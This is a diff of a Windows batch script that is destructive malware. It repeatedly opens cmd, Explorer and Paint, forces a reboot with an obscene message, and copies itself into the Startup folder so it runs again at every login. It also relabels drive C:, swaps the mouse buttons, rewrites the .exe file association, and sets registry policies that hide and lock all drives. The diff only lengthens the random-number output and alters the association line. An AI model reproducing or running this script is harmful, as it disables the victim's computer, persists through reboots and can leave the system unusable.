@@ -1,7 +1,7 @@
 @echo off
 :a
 color 02
-echo %random% %random% %random% %random% %random% %random% %random% %random%
+echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
 Start cmd
 shutdown /r /t 25 /c "PC FUCKING"​
 start explorer
@@ -9,7 +9,7 @@ start mspaint
 copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 label C:Fucked​
 rundll32 user32, SwapMouseButton
-assoc .exe=.bat
+assoc .exe=bat
 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f 
